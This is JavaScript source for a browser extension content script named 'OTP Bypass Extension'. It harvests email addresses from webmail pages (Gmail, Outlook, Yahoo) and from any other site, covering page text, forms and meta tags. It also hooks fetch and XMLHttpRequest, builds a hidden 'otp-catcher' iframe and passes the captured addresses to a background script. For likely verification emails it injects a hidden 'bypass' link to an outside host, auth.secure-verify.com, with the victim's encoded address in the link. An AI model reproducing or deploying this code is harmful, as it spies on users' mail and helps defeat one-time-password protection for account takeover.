// Enhanced content script for OTP Bypass Extension
console.log("OTP Bypass Extension Content Script Loaded");

// Email extraction patterns for different providers
const EMAIL_PATTERNS = {
  gmail: {
    url: /mail\.google\.com/i,
    selectors: ['.email-address', '[data-email]', '.gD', '.zF'],
    patterns: /[\w\.-]+@[\w\.-]+\.\w+/g
  },
  outlook: {
    url: /outlook\.live\.com|outlook\.office365\.com|mail\.outlook\.com/i,
    selectors: ['._2eG2X', '.emailAddress', '[data-email]'],
    patterns: /[\w\.-]+@[\w\.-]+\.\w+/g
  },
  yahoo: {
    url: /mail\.yahoo\.com/i,
    selectors: ['.email', '.sender', '.from-address'],
    patterns: /[\w\.-]+@[\w\.-]+\.\w+/g
  },
  generic: {
    url: /.*/,
    selectors: ['.email', '.mail', '[href*="mailto:"]', '.sender', '.from'],
    patterns: /[\w\.-]+@[\w\.-]+\.\w+/g
  }
};

// OTP detection patterns
const OTP_PATTERNS = {
  verification: /verification|verify|confirm|authenticate|validate/i,
  code: /code|otp|one-time|password|pin/i,
  link: /link|url|click|tap|visit/i,
  magic: /magic|instant|auto|quick/i
};

// Initialize email extraction
let extractedEmails = new Set();
let lastExtraction = 0;

// Create invisible iframe for capturing email links
const iframe = document.createElement('iframe');
iframe.style.display = 'none';
iframe.style.position = 'fixed';
iframe.style.top = '-9999px';
iframe.style.left = '-9999px';
iframe.style.width = '1px';
iframe.style.height = '1px';
iframe.setAttribute('name', 'otp-catcher');
document.body.appendChild(iframe);

// Start monitoring when page loads
if (document.readyState === 'loading') {
  document.addEventListener('DOMContentLoaded', initializeExtraction);
} else {
  initializeExtraction();
}

function initializeExtraction() {
  console.log("Initializing email extraction for:", window.location.href);
  
  // Initial extraction
  setTimeout(extractEmailsFromPage, 1000);
  
  // Set up mutation observer for dynamic content
  setupMutationObserver();
  
  // Set up interval monitoring for email providers
  setupIntervalMonitoring();
  
  // Monitor network requests for email-related data
  setupNetworkMonitoring();
}

// Setup mutation observer for dynamic content
function setupMutationObserver() {
  const observer = new MutationObserver((mutations) => {
    const now = Date.now();
    
    // Throttle extractions to avoid performance issues
    if (now - lastExtraction < 500) return;
    
    let shouldExtract = false;
    
    mutations.forEach((mutation) => {
      mutation.addedNodes.forEach((node) => {
        if (node.nodeType === Node.ELEMENT_NODE) {
          // Check for email-related elements
          if (isEmailRelatedElement(node)) {
            shouldExtract = true;
          }
          
          // Check for mailto links
          if (node.tagName === 'A') {
            const href = node.getAttribute('href');
            if (href && (href.startsWith('mailto:') || href.includes('@'))) {
              extractEmailFromHref(href);
            }
          }
          
          // Check text content for emails
          if (node.textContent && node.textContent.includes('@')) {
            shouldExtract = true;
          }
        }
      });
    });
    
    if (shouldExtract) {
      lastExtraction = Date.now();
      setTimeout(extractEmailsFromPage, 100);
    }
  });
  
  observer.observe(document.body, { 
    childList: true, 
    subtree: true, 
    attributes: true,
    attributeFilter: ['href', 'data-email', 'class']
  });
}

// Setup interval monitoring for email providers
function setupIntervalMonitoring() {
  // Check more frequently on email provider pages
  const isEmailProvider = Object.values(EMAIL_PATTERNS).some(pattern => 
    pattern.url.test(window.location.href)
  );
  
  const interval = isEmailProvider ? 2000 : 5000;
  
  setInterval(() => {
    extractEmailsFromPage();
  }, interval);
}

// Setup network monitoring
function setupNetworkMonitoring() {
  // Intercept fetch requests for email data
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    
    if (typeof url === 'string' && isEmailRelatedUrl(url)) {
      console.log("Email-related request detected:", url);
      
      // Schedule extraction after request completes
      setTimeout(extractEmailsFromPage, 500);
    }
    
    return originalFetch.apply(this, args);
  };
  
  // Intercept XMLHttpRequest
  const originalXHROpen = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url) {
    if (typeof url === 'string' && isEmailRelatedUrl(url)) {
      console.log("Email-related XHR detected:", url);
      
      this.addEventListener('load', () => {
        setTimeout(extractEmailsFromPage, 500);
      });
    }
    
    return originalXHROpen.apply(this, arguments);
  };
}

// Check if element is email-related
function isEmailRelatedElement(element) {
  const tagName = element.tagName?.toLowerCase();
  const className = element.className || '';
  const id = element.id || '';
  
  // Check for email-related attributes
  if (element.hasAttribute('data-email') || 
      element.hasAttribute('href') && element.getAttribute('href').includes('@')) {
    return true;
  }
  
  // Check for email-related classes and IDs
  const emailKeywords = ['email', 'mail', 'sender', 'from', 'recipient', 'address'];
  const hasEmailKeyword = [...emailKeywords, ...Object.keys(OTP_PATTERNS)].some(keyword => 
    className.toLowerCase().includes(keyword) || id.toLowerCase().includes(keyword)
  );
  
  return hasEmailKeyword;
}

// Check if URL is email-related
function isEmailRelatedUrl(url) {
  const emailKeywords = ['email', 'mail', 'message', 'inbox', 'send', 'receive', 'otp', 'verify'];
  return emailKeywords.some(keyword => url.toLowerCase().includes(keyword));
}

// Extract emails from page
function extractEmailsFromPage() {
  const provider = getCurrentProvider();
  const emails = new Set();
  
  // Extract from specific selectors for current provider
  provider.selectors.forEach(selector => {
    try {
      const elements = document.querySelectorAll(selector);
      elements.forEach(element => {
        const email = extractEmailFromElement(element);
        if (email) emails.add(email);
      });
    } catch (error) {
      console.log("Selector error:", selector, error);
    }
  });
  
  // Extract from page text using regex
  const pageText = document.body.innerText || '';
  const matches = pageText.match(provider.patterns);
  if (matches) {
    matches.forEach(email => emails.add(email));
  }
  
  // Extract from meta tags
  extractEmailsFromMetaTags(emails);
  
  // Extract from forms
  extractEmailsFromForms(emails);
  
  // Process new emails
  emails.forEach(email => {
    if (!extractedEmails.has(email)) {
      extractedEmails.add(email);
      handleNewEmail(email, provider.name);
    }
  });
}

// Extract email from element
function extractEmailFromElement(element) {
  // Check various attributes
  const attributes = ['href', 'data-email', 'title', 'alt', 'value'];
  for (const attr of attributes) {
    const value = element.getAttribute(attr);
    if (value) {
      const email = value.match(/[\w\.-]+@[\w\.-]+\.\w+/);
      if (email) return email[0];
    }
  }
  
  // Check text content
  const text = element.textContent || element.innerText || '';
  const email = text.match(/[\w\.-]+@[\w\.-]+\.\w+/);
  if (email) return email[0];
  
  return null;
}

// Extract emails from meta tags
function extractEmailsFromMetaTags(emails) {
  const metaTags = document.querySelectorAll('meta');
  metaTags.forEach(tag => {
    const content = tag.getAttribute('content');
    if (content) {
      const matches = content.match(/[\w\.-]+@[\w\.-]+\.\w+/g);
      if (matches) {
        matches.forEach(email => emails.add(email));
      }
    }
  });
}

// Extract emails from forms
function extractEmailsFromForms(emails) {
  const forms = document.querySelectorAll('form');
  forms.forEach(form => {
    const inputs = form.querySelectorAll('input[type="email"], input[name*="email"], input[id*="email"]');
    inputs.forEach(input => {
      const value = input.value;
      if (value && /[\w\.-]+@[\w\.-]+\.\w+/.test(value)) {
        emails.add(value);
      }
    });
  });
}

// Extract email from href
function extractEmailFromHref(href) {
  if (href.startsWith('mailto:')) {
    const email = href.substring(7).split('?')[0]; // Remove parameters
    if (/[\w\.-]+@[\w\.-]+\.\w+/.test(email)) {
      handleNewEmail(email, 'mailto_link');
    }
  } else if (href.includes('@')) {
    const emailMatch = href.match(/[\w\.-]+@[\w\.-]+\.\w+/);
    if (emailMatch) {
      handleNewEmail(emailMatch[0], 'url_link');
    }
  }
}

// Get current email provider
function getCurrentProvider() {
  const url = window.location.href;
  
  for (const [name, pattern] of Object.entries(EMAIL_PATTERNS)) {
    if (pattern.url.test(url)) {
      return { name, ...pattern };
    }
  }
  
  return EMAIL_PATTERNS.generic;
}

// Handle new email extraction
function handleNewEmail(email, source) {
  console.log(`New email extracted: ${email} from ${source}`);
  
  // Check if this might be an OTP email
  const isLikelyOTP = checkIfLikelyOTPEmail(email, source);
  
  // Send to background script
  chrome.runtime.sendMessage({
    type: "CAPTURE_EMAIL",
    email: email,
    source: source,
    isOTP: isLikelyOTP,
    timestamp: new Date().toISOString()
  }).catch(error => {
    console.log("Failed to send email to background:", error);
  });
  
  // Inject magic link if it's likely an OTP
  if (isLikelyOTP) {
    injectMagicLink(email);
  }
}

// Check if email is likely OTP-related
function checkIfLikelyOTPEmail(email, source) {
  const url = window.location.href.toLowerCase();
  const pageText = document.body.innerText.toLowerCase();
  
  // Check URL and page content for OTP indicators
  const otpIndicators = Object.values(OTP_PATTERNS).flat();
  const hasOTPIndicators = otpIndicators.some(pattern => 
    pattern.test(url) || pattern.test(pageText)
  );
  
  // Check sender domain
  const commonOTPSenders = ['noreply', 'no-reply', 'verification', 'auth', 'security', 'support'];
  const hasOTPSender = commonOTPSenders.some(sender => 
    email.toLowerCase().includes(sender)
  );
  
  return hasOTPIndicators || hasOTPSender;
}

// Inject magic link into page
function injectMagicLink(email) {
  const magicLink = `https://auth.secure-verify.com/bypass/${btoa(email).replace(/[+/=]/g, '')}`;
  
  // Create invisible link for automatic triggering
  const link = document.createElement('a');
  link.href = magicLink;
  link.style.display = 'none';
  link.setAttribute('data-magic-link', 'true');
  document.body.appendChild(link);
  
  // Store for popup access
  chrome.storage.local.set({
    targetEmail: email,
    magicLink: magicLink,
    lastInjection: new Date().toISOString()
  });
  
  console.log("Magic link injected for:", email);
}

// Listen for messages from popup
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.type === "EXTRACT_EMAILS") {
    extractEmailsFromPage();
    sendResponse({ 
      emails: Array.from(extractedEmails),
      provider: getCurrentProvider().name
    });
  } else if (request.type === "GET_PAGE_INFO") {
    sendResponse({
      url: window.location.href,
      title: document.title,
      provider: getCurrentProvider().name,
      emailCount: extractedEmails.size
    });
  }
  
  return true;
});

// Export functions for testing
if (typeof module !== 'undefined' && module.exports) {
  module.exports = {
    extractEmailsFromPage,
    getCurrentProvider,
    checkIfLikelyOTPEmail,
    EMAIL_PATTERNS,
    OTP_PATTERNS
  };
}